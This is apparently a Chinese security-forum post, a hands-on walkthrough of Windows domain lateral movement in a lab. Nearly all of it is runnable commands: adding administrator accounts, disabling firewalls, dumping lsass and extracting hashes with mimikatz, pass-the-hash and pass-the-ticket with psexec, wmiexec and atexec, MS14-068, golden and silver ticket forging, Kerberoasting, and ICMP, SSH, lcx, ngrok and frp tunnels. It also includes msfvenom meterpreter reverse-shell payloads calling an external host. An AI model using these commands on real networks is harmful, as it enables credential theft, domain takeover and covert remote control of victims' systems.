* * *

#
[](https://bbs.pediy.com/thread-268289.htm#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E5%9F%BA%E6%9C%AC%E6%94%B6%E9%9B%86)一、信息基本收集

当一台机子返回会话后，我们可以使用相关命令进行相应的信息收集

##
[](https://bbs.pediy.com/thread-268289.htm#1.1%E6%94%B6%E9%9B%86%E5%9F%BA%E6%9C%AC%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%9A)1.1收集基本的信息：

Systeminfo 计算机详细信息(补丁信息)  
Net start 所启动的服务  
Wmic service list brief 查询本机服务信息  
Tasklist 进程列表  
Wmic startup get command,caption 查看启动该程序信息  
Schtasks /query /fo LIST /v计划任务  
Netstat -ano 根据本机端口开放情况来判断有什么服务、其角色  
Query user || qwinsta 查看当前在线用户  
Net session 列出会话  
Net share 查看本机的共享列表  
Wmic share get name,path,status 查看共享列表  
Net user 本地用户  
Net user kkkk 查看本地用户信息  
Net user kent password /add添加本地用户  
Net localgroup 本地用户组  
Net localgroup /domain 域用户组  
Net localgroup Administrators kent /add 将本地用户添加到本地管理员组  
Net localgroup adminnstrators 本地管理员组成员  
net localgroup adminstrators /domain 域管理员组成员  
Wmic useraccount get /all 获取域内用户详细信息  
dsquery user 查看存在的用户  
Net user /domain 域用户信息  
Net user kkkk /domain 域用户kkkk信息  
Net user kent password /add /domain添加域用户  
Net localgroup Administrators kent /add /domain 将域用户添加到域管理员组  
Net localgroup Administrators /add test\kent 将域用户添加到本地管理员组  
Net group /domain 域用户组信息  
Net view /domain 查询域  
Net view /domain:test 查询域内计算机  
Net accounts /domain 查询域中密码策略  
Net group /domain 查看域内所有用户组  
Net group “Domain Controllers” /domain 查看域控制器组  
Net group “Domain computers” /domain 查看域内所有计算机列表  
Net group “Domain admins” /domain 查看域内管理员用户  
Net user /domain kent active:yes 启用域账户  
Net user /domain kent active:no 禁用域账户  
Nltest /DCLIST:test 查看域中域控制器名  
Wmic useraccount get /all 用户详细信息  
Net group “Domain Admins” /domain 对应组下的账户信息  
nltest /domain_trusts 获取域信任信息  
net config workstation 了解本机的配置信息  
Netsh firewall show config 查看防火墙配置  
Netsh advfirewall set allprofiles state off关闭防火墙(windows server 2003后)  
Netsh advfirewall firewall add rule name=”pass nc” dir=in action=allow
program=”C:\nc.exe” 允许指定程序进入(windows server 2003后)  
Netsh advfirewall firewall add rule name=”allow nc” dir=out action=allow
program=”C:\nc.exe”允许指定程序退出(windows server 2003后)  
Netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in
localport=3389 action=allow 允许3389连接(windows server 2003后)  
Netsh advfirewall set currentprofile logging filename=”C:\winodws\temp\fw.log”
自定义防火墙日志存储位置  
Reg query
“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet
Settings”查看端口代理配置信息  
Reg query “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
Server\WinStations\RDP-Tcp” /V PortNumber查看远程桌面端口号  
以下命令是开启3389端口 (windows server 2003后)  
wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting
where (__CLASS != "") call setallowtsconnections 1  
wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where
(TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1  
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
fSingleSessionPerUser /t REG_DWORD /d 0 /f  
net start TermService

##
[](https://bbs.pediy.com/thread-268289.htm#1.2%E6%94%B6%E9%9B%86%E7%AC%AC%E4%B8%89%E6%96%B9%E7%99%BB%E5%BD%95%E5%87%AD%E8%AF%81%E6%94%B6%E9%9B%86%EF%BC%9A)1.2收集第三方登录凭证收集：

SharpDecryptPwd：  
https://github.com/uknowsec/SharpDecryptPwd/raw/master/SharpDecryptPwd.exe  
TeamViewer :SharpDecryptPwd.exe -TeamViewer  
Navicat: SharpDecryptPwd.exe -NavicatCrypto  
Xshell：SharpDecryptPwd.exe -Xmangager -p SessionPath -s username+sid(whoami
/user)  
laZagne ：  
https://github.com/ethicalhackeragnidhra/LaZagne/archive/2.3.1.zip  
使用方法：laZagne.exe all



我们用上述命令简单收集计算机基本信息：  
Ipconfig /all 根据DNS后缀判断是否有域  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_48W2TXKXQJCT4CN.png)  
Net view /domain 判断是否存在域  
确定域控的ip地址：  
net time /domain  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_6B5EA87AEUT9Y2P.png)  
然后通过nslookup或ping确定其域控ip:  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_DSCH2B985WR3PAZ.png)  
确定当域内存活主机：  
for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr “TTL=”

#
[](https://bbs.pediy.com/thread-268289.htm#%E4%BA%8C%E3%80%81%E4%BD%BF%E7%94%A8%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8)二、使用明文传递进行内网横向移动

## [](https://bbs.pediy.com/thread-268289.htm)2.1Windows server 2008 使用自带的at命令

使用明文密码登录到域控，需要135端口开启：  
Net use \192.168.202.148\ipc$ password /user:test\administrator  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_HWZ7YBG9YGXJXBR.png)  
把后门复制到域控c盘，at新建定时作业：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_GRBP4GZW2BCDEZ6.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_AS3YHTA89EWZWGV.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_3HA2WMG2VDFWY82.png)



Windows server 2012及以上使用schtasks命令  
Schtasks /create /s 192.168.202.148 /ru “SYSTEM” /tn executefile /sc DAILY /tr
c:/h4.exe /F  
Schtasks /run /s 192.168.202.148 /tn executefile /i  
Schtasks /delete /s 192.168.202.148 /tn executefile /f

##
[](https://bbs.pediy.com/thread-268289.htm#2.2%E4%BD%BF%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E5%B7%A5%E5%85%B7%E5%8C%85impacket%E4%B8%ADatexec.exe)2.2使用第三方工具包impacket中atexec.exe

Atexec.exe test/administrator:zxcvbnm123@192.168.202.148 “whoami”  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_3P6X4982CMWTA4X.png)  
Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6
test/administrator@192.168.202.148 “whoami”  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_PWNYDUUDXUMDE29.png)

##
[](https://bbs.pediy.com/thread-268289.htm#2.3%E7%BB%93%E5%90%88%E6%89%B9%E5%A4%84%E7%90%86%E5%88%A9%E7%94%A8%EF%BC%9A)2.3结合批处理利用：

已知密码和用户批量连接ip:  
FOR /F %%i in (ips.txt) do net use \%%i\ipc$ “password”
/user:test\administrator  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_YU7YHH9HA3ZR6C2.png)  
已知用户和ip批量连接密码：  
FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ “%%i”
/user:test\administrator  
已知用户和ip批量连接hash：  
FOR /F %%i in (hash.txt) do atexec.exe -hashes :“%%i”
test/administrator@192.168.202.148 “whoami”  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_XH5YQNN427T45EU.png)

#
[](https://bbs.pediy.com/thread-268289.htm#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8hash%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8)三、利用hash进行横向移动

在windows server 2012以上的版本默认关闭wdiget，攻击者无法在内存中获取明文密码。  
在windows server 2012以下的版本如果安装了KB2871997补丁，也无法获取明文密码。

##
[](https://bbs.pediy.com/thread-268289.htm#3.1%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9Fhash)3.1获取系统hash

Procdump.exe -accepteula -ma lsass.exe lsass.dmp(需要管理员权限)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_S2VPY86S5B8KW7W.png)  
利用Mimikatzm相关命令获取dmp中的hash：  
Privilege::debug  
Sekurlsa::minidump lsass.dmp  
Sekurlsa::logonPasswords full  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_G5BB6569HJ4AAV8.png)  
可以通过hashcat爆破hash值，获得对应的明文密码：  
Hashcat -a 0 -m 1000 hashfile passfile

##
[](https://bbs.pediy.com/thread-268289.htm#3.2%E9%80%9A%E8%BF%87%E6%98%8E%E6%96%87%E6%88%96hash%E5%88%A9%E7%94%A8smb%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8)3.2通过明文或hash利用SMB服务进行横向移动

官方Psexec第一种利用方法：可以先有ipc链接，再用psexec运行相应的程序：  
Net use \192.168.202.148\ipc$ zxcvbnm123 /user:test\Administrator  
Psexec \192.168.202.148 -accepteula -s cmd  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_47G2K567FFVFDHS.png)  
官方Psexec第二种利用方法：不用建立ipc连接，直接使用密码或hash进行传递  
Psexec \192.168.202.148 -u Administrator -p zxcvbnm123 -s cmd  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_PUTCKWD8XHJ79QN.png)  
PsExec -hashes :fac5d668099409cb6fa223a32ea493b6
test.com/Administrator@192.168.202.148 "whoami" (官方执行不了)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_8PQFGJR5NG6S9ST.png)



使用第三方Impacket工具包中的smbexec和psexec（使用方法同官方一致）  
使用Impacket第三方PsExec，命令与官方的一致：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_QSP37S3AR7TUPXH.png)  
使用Impacket第三方Smbexec：  
Smbexec test/Administrator:zxcvbnm123@192.168.202.148  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_ABPK7AT2MU8XGDR.png)  
Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6
test/Administrator@192.168.202.148  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_TGTZ96NTS6U8EYB.png)

## [](https://bbs.pediy.com/thread-268289.htm)3.3 利用WMI服务进行横向移动

WMI利用135端口，支持明文和hash两种方式进行身份验证，且系统日志不记录。  
第一种：使用系统自带的WMIC明文传递执行相应命令，但执行的结果不回显（先管理员账户登录）  
Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process
call create “cmd.exe /c ipconfig >C:/1.txt”  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_M54H3UEQUZPHS4B.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_Q8Z2H9ETEAN9SQZ.png)



第二种：使用系统自带cscript明文传递执行反弹shell，执行结果有回显，现已被杀  
Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123



第三种：使用第三方impacket套件中的Wmiexec进行明文或hash传递，执行结果有回显  
Wmiexec test/Administrator:zxcvbnm123@192.168.202.148 “whoami”  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_FDEV5ZVYREAXBRA.png)  
Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6
test/Administrator@192.168.202.148 “whoami”  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_43FNE5ARNJR5FHY.png)

##
[](https://bbs.pediy.com/thread-268289.htm#3.4%E5%88%A9%E7%94%A8mimikatz%E8%BF%9B%E8%A1%8Cpth)3.4利用Mimikatz进行PTH

PTH是攻击者通过LM Hash和NTLM Hash访问远程主机或服务，不需提供明文密码。当禁用了NTLM
Hash验证时，不能使用PsExec进行Hash传递，mimikatz还是可以。  
Privilege::debug  
Sekurlsa::pth /user:Administrator /domain:test
/ntlm:fac5d668099409cb6fa223a32ea493b6  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_BRZGNT44RGY4J97.png)  
关于KB22871997是否能防护PTH攻击？  
Pth：没有打补丁时，任何用户都可以连接，打了补丁只能administrator连接  
Ptk：打了补丁后，用户才能可以连接，采用aes256连接

## [](https://bbs.pediy.com/thread-268289.htm)3.5 利用RDP进行横向移动

1、使用明文密码连接RDP  
Windows: Mstsc.exe /console /v:192.168.202.148 /admin  
Linux: rdesktop 192.168.202.148:3389  
2、使用hash连接RDP  
使用hash 连接需要Restricted Admin mode开启，Windows server 2012默认开启了，windows server
2008需要安装2871997、2973351补丁后，执行下面命令：  
REG ADD “HKLM\System\CurrentControlSet\Control\Lsa” /v DisableRestrictedAdmin
/t REG_DWORD /d 00000000 /f  
当开启后就能使用mimikatz进行hash连接RDP：  
Privilege::debug  
Sekurlsa::pth /user:Administrator /domain:test
/ntlm:fac5d668099409cb6fa223a32ea493b6 “/run:mstsc.exe /restrictedadmin”

## [](https://bbs.pediy.com/thread-268289.htm)3.6 PTK(pass the key)在横向移动利用

利用ekeys aes256  
Sekurlsa::ekeys 获取aes  
Sekurlsa::pth /user:Administrator /domain:test2
/aes256:6e09831ee88fb85c8a3f4a88dea70e2a1b18197b70d57a9eebad73b45137433d  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_GEK33J6XRJYTSGD.png)

# [](https://bbs.pediy.com/thread-268289.htm)四、 PTT票据传递在横向移动利用

PTT(pass the
ticket)不再使用NTLM进行认证，而是利用kerberos协议进行攻击,相对于PTH来说其不需要管理员权限，有三种常见的攻击方式：MS14-068(漏洞编号kb3011780)、Golder
ticket、Silver ticket，其中后两者是将连接合法的票据注入内存中属于权限维持（后面写）。

## [](https://bbs.pediy.com/thread-268289.htm)4.1 利用相关漏洞

第一种使用MS14-068 exp：  
先用whoami /user查看当前用户sid  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_F7AKAPEREP67SBG.png)  
Kerberos::purge或klist purge先清空当前机器中的所有凭证：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_WD34AVBE6WJR6SB.png)  
利用MS14-068生成相应凭证：  
MS14-068.exe -u c@test.com -s S-1-5-21-2273191065-1635484360-3888421177-1105
-d 192.168.202.148 -p c@zxcvbnm123  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_53RYB4W3KMTTPVB.png)  
使用mimikatz将票据注入内存：  
Kerberos::ptc “TGT_c@test.com.ccache”  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_WPHCCTHUNWCW3Y5.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_JZWD87Q9QYNM24T.png)  
后续利用：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_KYP2E9FQWA4X93G.png)  
第二种kekeo利用hash生成票据：  
Kekeo “tgt::ask /user:c /domain:test.com
/ntlm:abe09320f41c250eadcc5bfba77a5e1a”  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_YKGR495R7FDFSE3.png)  
同样清楚票据并导入生成的票据：  
kerberos::ptt TGT_c@TEST.COM_krbtgt~test.com@TEST.COM.kirbi  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_J8E66Y4F6MP3PFS.png)  
第三种利用mimikatz收集本地的票据并重新导入（导出需要管理员权限）：  
Sekurlsa::tickets /export  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_XNQ9TWUADVCJZDP.png)  
使用Kerberos::ptt 进行导入票据。

## [](https://bbs.pediy.com/thread-268289.htm)4.2 Golder ticket

Golder
ticket使用krbtgt账户的密码hash值，利用伪造高权限的TGT向KDC要求颁发拥有任意服务访问权限的票据，从而获得域控权限。在域环境中，每个账户的票据都是Krbtgt生成的，当攻击者得到krbtgt
hash或AES256值后，我们就可以伪造任一域用户的身份，并用该身份进行访问。伪造Golder ticket利用条件：  
1、krbtgt用户hash或AES256值  
2、域名称  
3、域的SID值  
4、要伪造的管理员名



下面是具体操作：  
Privilege::debug  
执行导出krbtgt hash命令 Lsadump::dcsync /domain:test.com /user:krbtgt  
获得hash值：71204258ec5b715c29f6c8ee40a0c20d  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_4UP5DTPSTDQVR2C.png)  
获取域SID  
Wmic useraccount get name,sid  
S-1-5-21-2273191065-1635484360-3888421177-500  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_27BNPRH4UPB23B5.png)  
查询域管理员账户 net group “domain admins” /domain  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_43NUMK844CTJ333.png)  
获得域名 ipconfig /all  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_TVUEF5YTN7MHHHQ.png)  
Kerberos::purge清空票据，然后使用下面命令生成krbtgt的票据  
kerberos::golden /user:Administrator /domain:test.com
/sid:S-1-5-21-2273191065-1635484360-3888421177-500
/krbtgt:71204258ec5b715c29f6c8ee40a0c20d /ticket:krbtgt. kiribi  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_DUG83D24NKGRYJK.png)  
kerberos::ptt krbtgt.kiribi 把生成的票据重新导入内存  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_XDESX2R64QHBK5V.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_8NHUSX7QQSGJFZP.png)

## [](https://bbs.pediy.com/thread-268289.htm)4.3 Silver Ticket

Silver
Ticket会通过相应的服务账户来伪造TGS，例如LDAP、MSSQL、WinRM、CIFS等，范围相对有限，只能获取对应服务权限，且Silver
Ticket是由特定的账户加密的。利用条件：  
1、域名  
2、域SID  
3、目标服务器的FQDN  
4、可利用的服务  
5、服务账号的NTLM Hash  
6、需要伪造的用户名  
下面进行相应的操作：  
先清空系统中的票据 ：  
Kerberos::purge  
使用mimikatz生成伪造的 Silver Ticket ：  
kerberos::golden /user:Administrator /domain:test.com
/sid:S-1-5-21-2273191065-1635484360-3888421177-500 /target:WIN-
MPPGQR2OWEC.test.com /service:cifs /rc4:fac5d668099409cb6fa223a32ea493b6
/user:c3 /ptt  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_347HDAVEMMRXV2W.png)  
退出mimikatz，查看内存中的票据：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_TTYEMJQTVJDW78E.png)  
重新访问域控的共享目录：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_6XEBB4ASEY47CCN.png)

#
[](https://bbs.pediy.com/thread-268289.htm#%E4%BA%94%E3%80%81%E5%88%A9%E7%94%A8spn%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8)五、利用SPN服务进行横向移动

在域环境中，SPN扫描是查找相关服务较好的方法，可以从相关服务着手，如MSSQL、WSMAN、Exchange、TERMSERV、Hyper-V。其扫描是通过请求特定SPN类型的服务主题名称进行的。与普通网络端口相比，SPN扫描不需要连接IP来检测服务端口，所以能规避一些IPS的规则，且进行扫描只需普通域用户权限。  
注册SPN  
Setspn -A c3/test MSSQL  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_JFE2FPPJ7PNSFBZ.png)  
查看注册的SPN  
Setspn -q _/_  
Setspn -q _/_ | findstr “MYSQL”  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_Z7ZRGCTCK2TAEGE.png)  
请求服务票据  
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
-ArgumentList "MySQL/win7.xie.com:3306/MySQL"  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_R8979DQSWYDTG6M.png)  
列出服务票据  
Klist  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_JXQTKKT3SHYT8SF.png)  
并用mimikatz将票据导出  
Kerberos::list /export  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_9GJ9D6KCKVBW7MW.png)  
最后使用tgsrepcrack.py爆破得到相应密码。

#
[](https://bbs.pediy.com/thread-268289.htm#%E5%85%AD%E3%80%81%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1)六、隧道通信

## [](https://bbs.pediy.com/thread-268289.htm)6.1 网络层隧道

1

2

|

`ICMP隧道是网络层常用的隧道之一。在ICMP协议中，设备间的通信是不需要开放相应的端口。当攻击者使用各类上层隧道进行通信均失败时，则可通过ping命令访问目标计算机，并尝试建立ICMP隧道，将TCP``/``UDP等相应需要传输的数据封装到ping数据包中，从而穿过防火墙实现通讯。`

`其中PingTunnel是ICMP隧道的常用工具，可跨平台使用。下面使用该工具进行相应的操作：`  
  
---|---  
  
先在受控端（web服务器）运行PingTunnel工具，执行开启隧道命令  
sudo ./pingtunnel -type server  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_AB5W5S5BHVS4WUJ.png)  
在控制端（公网vps）执行下面命令，打开需要监听的本地端口，会把指定的服务器相应端口的数据封装在ICMP隧道中，以受控端（web服务器）为IMCP隧道跳板进行传输。  
pingtunnel -type client -l :本地所监听的端口 -s 受控端IP -t 指定要转发的目标IP:指定要转发的目标端口 -tcp 1  
pingtunnel -type client -l :33444 -s 192.168.74.132 -t 192.168.96.145:80 -tcp
1  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_QK2JRKQ45MF9NWQ.png)  
访问本地监听端口：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_C8ZWJ3GX3BUZKPD.png)

## [](https://bbs.pediy.com/thread-268289.htm)6.2 传输层隧道

Lcx是传输层经典的转发工具。Lcx是一个基于Socket套接字实现的转发工具，其linux版本为portmap。一个正常的Socket隧道必须具备两端：一端为服务端，负责监听一个端口并等待客户端连接；另一端为客户端，通过服务端的地址和端口与其连接，并转发相应的数据给服务端。  
在自己的公网vps（即服务端）执行监听命令，将本机4444端口上监听的所有数据转发给本机的5555端口，以便其它机器访问。  
Lcx.exe -listen 4444 5555  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_2Y4S34KV657RGWU.png)  
在受控端（即客户端）执行数据转发命令，将目标机器的80端口转发到公网vps的4444端口。  
Lcx.exe -slave 公网ip 4444 目标机器IP 80  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_FES9GHVB9CEN4KJ.png)  
我们通过vps的ip和5555访问到目标机器的80端口：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_YA4Z42HDVAZX2PU.png)



同样地lcx也常用于本地端口映射，当目标服务器由于防火墙限制，部分端口没能通过防火墙时，可以将目标服务器响应端口数据转发到防火墙允许的端口。在目标服务器执行下面命令，即可把远程桌面转到53端口：  
Lcx -tran 53 目标服务器IP 3389

## [](https://bbs.pediy.com/thread-268289.htm)6.3 应用层隧道

1

2

|

`应用层的隧道通信主要利用应用软件提供的端口转发数据。常见的应用层隧道协议有SSH、HTTP、DNS等。其中SSH协议通常是被允许通过防火墙和边界设备的，且内网中Linux设备都支持SSH协议，同时SSH的传输过程是加密的，使得难以区分合法的SSH和攻击者建立的隧道。`

`常用的SSH隧道有以下几种类型：本地转发、远程转发、动态转发。SSH命令常用参数有:`  
  
---|---  
  
-C：压缩传输，提高速度。  
-f: 后台执行  
-N:建立静默连接  
-g:允许远程主机连接本地用于转发的端口  
-L:本地端口转发  
-R:远程端口转发  
-D:动态端口转发  
-P:指定SSH端口



本地转发：  
在VPS执行如下相应命令，该命令以web服务器为跳板，将内网服务器的端口映射到公网的vps上，我们访问对应公网vps的端口即可。  
Ssh -CfNg -L 公网VPS端口:目标主机IP:目标端口号 root@跳板机IP



远程转发：  
当公网的vps不能访问访问到内网的服务器（包括web服务器），但web服务器能访问到公网的vps时，我们在web服务器执行如下相应命令，该命令以web服务器为跳板，将vps端口的流量转发到内网服务器相应端口上，我们访问对应公网vps的端口即可。  
Ssh -CfNg -R vps端口:目标主机IP:目标端口号 root@跳板机IP



动态转发：  
动态端口映射时建立一个ssh加密的socks4/5代理通道，任何支持socks4/5协议的程序都可以通过此通道进行代理访问。我们在vps上执行如下命令：  
ssh -CfNg -D 7000 root@代理主机IP

## [](https://bbs.pediy.com/thread-268289.htm)6.4 Ngrok实现内网穿透

执行命令./sunny clientid d8d99b5ff5d4996  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_C8KXY3PHT6RT74T.png)  
访问对应的域名，确认能连接成功：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_DNUQHQK45N68J4S.png)  
执行命令生成相应的exe：  
msfvenom -p windows/meterpreter/reverse_http lhost=mai1zhi2.free.idcfengye.com
lport=80 -f exe -o h7.exe  
设置好相应的payload后，打开监听，运行exe：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_FADX3B7NE9YCSSV.png)

## [](https://bbs.pediy.com/thread-268289.htm)6.5 frp实现内网穿透

服务端默认监听端口是7000，执行命令，启动服务端 ./frps -c ./frps.ini  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_SYZ7DKFHGMAZBGS.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_ADBHQ5B6V5RXNDF.png)  
启动客户端frpc配置文件:  
[msf]  
type = tcp  
local_ip = 本地ip地址  
local_port = 22222 转发给本机的22222端口，也就是msf的监听端口  
remote_port = 6000 服务端打开6000端口进行监听  
执行命令连接服务端：./frpc -c ./frpc.ini  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_XEPPT8DSRAPMJ5C.png)  
服务端显示有客户端连接：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_DREBEB9WEBZSMUR.png)  
服务端开启6000端口进行监听  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_JV8NVHRRYDKN8JM.png)  
Msf生成exe文件：  
msfvenom -p windows/meterpreter/reverse_http lhost=公网ip lport=公网ip监听的端口 -f exe
-o h4.exe  
